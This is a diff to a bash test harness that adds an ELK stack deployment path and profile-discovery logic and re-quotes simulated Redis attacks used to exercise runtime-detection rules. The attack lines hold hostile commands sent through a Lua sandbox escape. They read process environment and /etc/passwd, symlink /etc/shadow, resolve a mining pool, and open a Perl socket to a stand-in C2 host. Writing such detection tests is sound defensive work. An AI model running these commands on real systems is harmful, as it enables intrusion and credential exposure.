@@ -62,8 +62,17 @@ case "$APP" in
     APP_PORT=443
     APP_SCHEME=https
     ;;
+  elk)
+    APP_NS=elk
+    APP_DEPLOY_METHOD=elk
+    APP_FUNC_TESTS=example/elk-functional-tests.yaml
+    APP_ATTACKS=example/elk-attacks.yaml
+    APP_SERVICE=el-es-http
+    APP_PORT=9200
+    APP_PROFILE_MATCH="el-es"
+    ;;
   *)
-    die "Unknown app: $APP (use webapp, redis, or misp)"
+    die "Unknown app: $APP (use webapp, redis, misp, or elk)"
     ;;
 esac
 
@@ -165,6 +174,65 @@ if ! $TUNE_ONLY; then
     done
     [[ -n "$PROFILE" ]] || die "No completed profile found after ${TIMEOUT}s"
 
+  elif [[ "$APP_DEPLOY_METHOD" == "elk" ]]; then
+    log "=== Deploy ELK stack ==="
+    # Install ECK operator
+    helm upgrade --install elastic-operator elk/eck-operator-3.3.0.tgz \
+      -n elastic-system \
+      --create-namespace \
+      --wait \
+      --timeout 10m
+
+    # Deploy Elasticsearch, Kibana, Elastic Agent
+    kubectl create namespace elk 2>/dev/null || true
+    kubectl apply -f elk/elastic-components.yaml
+
+    # Wait for Elasticsearch to be ready (ECK uses a StatefulSet)
+    log "Waiting for Elasticsearch to be ready..."
+    kubectl wait --for=condition=ready pod -l elasticsearch.k8s.elastic.co/cluster-name=el \
+      -n elk --timeout=600s || {
+      log "WARNING: ES pod not ready yet, checking status..."
+      kubectl get pods -n elk
+    }
+
+    # Wait for Kibana
+    log "Waiting for Kibana to be ready..."
+    kubectl wait --for=condition=ready pod -l kibana.k8s.elastic.co/name=kb \
+      -n elk --timeout=300s 2>/dev/null || true
+
+    # Run functional tests during learning to exercise ES
+    log "Running functional tests during learning period..."
+    for i in $(seq 1 6); do
+      bin/bobctl learn \
+        --functional-tests "$APP_FUNC_TESTS" \
+        -n "$APP_NS" --timeout 15s --interval 15s -v 2>&1 | tail -5 || true
+      sleep 10
+    done
+
+    # Poll for completed profile
+    log "Waiting for completed profile (prefer name containing 'el')..."
+    TIMEOUT=600
+    ELAPSED=0
+    PROFILE=""
+    while [ $ELAPSED -lt $TIMEOUT ]; do
+      ALL_COMPLETED=$(kubectl get applicationprofiles -n "$APP_NS" \
+        -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
+        2>/dev/null | grep -v "^ug-" || true)
+      # Prefer profile whose name contains "el-es" (Elasticsearch)
+      PROFILE=$(echo "$ALL_COMPLETED" | grep -i "el-es\|elastic" | head -1)
+      [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_COMPLETED" | head -1)
+      if [[ -n "$PROFILE" ]]; then
+        log "Profile completed: $PROFILE"
+        log "All completed profiles in $APP_NS:"
+        echo "$ALL_COMPLETED" | while read -r p; do [[ -n "$p" ]] && log "  - $p"; done
+        break
+      fi
+      log "  No completed profile yet ($ELAPSED/${TIMEOUT}s)..."
+      sleep 15
+      ELAPSED=$((ELAPSED + 15))
+    done
+    [[ -n "$PROFILE" ]] || die "No completed profile found after ${TIMEOUT}s"
+
   else
     log "=== Install and learn $APP ==="
     PROFILE=$(bin/bobctl install \
@@ -184,11 +252,15 @@ else
     PROFILE=$(cat /tmp/bobctl-last-profile-$APP)
     log "Re-using saved profile: $PROFILE"
   else
-    # Discover from cluster
+    # Discover from cluster — prefer profile whose name contains the app/service name
     log "Discovering completed profiles in $APP_NS..."
-    PROFILE=$(kubectl get applicationprofiles -n "$APP_NS" \
+    ALL_LEARNED=$(kubectl get applicationprofiles -n "$APP_NS" \
       -o jsonpath='{range .items[?(@.metadata.annotations.kubescape\.io/status=="completed")]}{.metadata.name}{"\n"}{end}' \
-      2>/dev/null | grep -v "^ug-" | head -1)
+      2>/dev/null | grep -v "^ug-" || true)
+    MATCH="${APP_PROFILE_MATCH:-$APP}"
+    PROFILE=$(echo "$ALL_LEARNED" | grep -i "$MATCH" | grep -v "client" | head -1)
+    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | grep -i "$APP" | head -1)
+    [[ -z "$PROFILE" ]] && PROFILE=$(echo "$ALL_LEARNED" | head -1)
     [[ -n "$PROFILE" ]] || die "No completed learned profile found in $APP_NS. Run without --tune-only first."
     log "Discovered profile: $PROFILE"
   fi
@@ -285,8 +357,8 @@ if [[ "$APP" == "redis" ]]; then
   run_eval "environ-R0008" "${LUA_ESCAPE} local f=io_mod.popen('cat /proc/1/environ 2>/dev/null | tr \"\\\\0\" \"\\\\n\" | head -1 || echo no_environ');local o=f:read('*a');f:close();return 'environ:' .. o"
   run_eval "symlink-R1010" "${LUA_ESCAPE} local f=io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1; rm -f /tmp/shadow_link; echo symlink_done');local o=f:read('*a');f:close();return 'symlink:' .. o"
   run_eval "mining-R1008" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done');local o=f:read('*a');f:close();return 'mining:' .. o"
-  run_eval "perl-c2-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"perl -e 'use IO::Socket::INET;my \\$s=IO::Socket::INET->new(PeerAddr=>\\\"c2.evil.example.com\\\",PeerPort=>80,Timeout=>2);print defined \\$s ? \\\"ok\\\" : \\\"fail\\\";' 2>&1; echo done\");local o=f:read('*a');f:close();return 'c2:' .. o"
-  run_eval "creds-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"awk -F: '\\$3==0{print \\$1}' /etc/passwd && id 2>&1\");local o=f:read('*a');f:close();return 'creds:' .. o"
+  run_eval "perl-c2-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("perl -e '"'"'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"ok\" : \"fail\";'"'"' 2>&1; echo done");local o=f:read("*a");f:close();return "c2:" .. o'
+  run_eval "creds-R0001" "${LUA_ESCAPE}"' local f=io_mod.popen("awk -F: '"'"'$3==0{print $1}'"'"' /etc/passwd && id 2>&1");local o=f:read("*a");f:close();return "creds:" .. o'
 
   log "All 12 Redis attacks executed. Waiting for alert propagation..."
   sleep 15
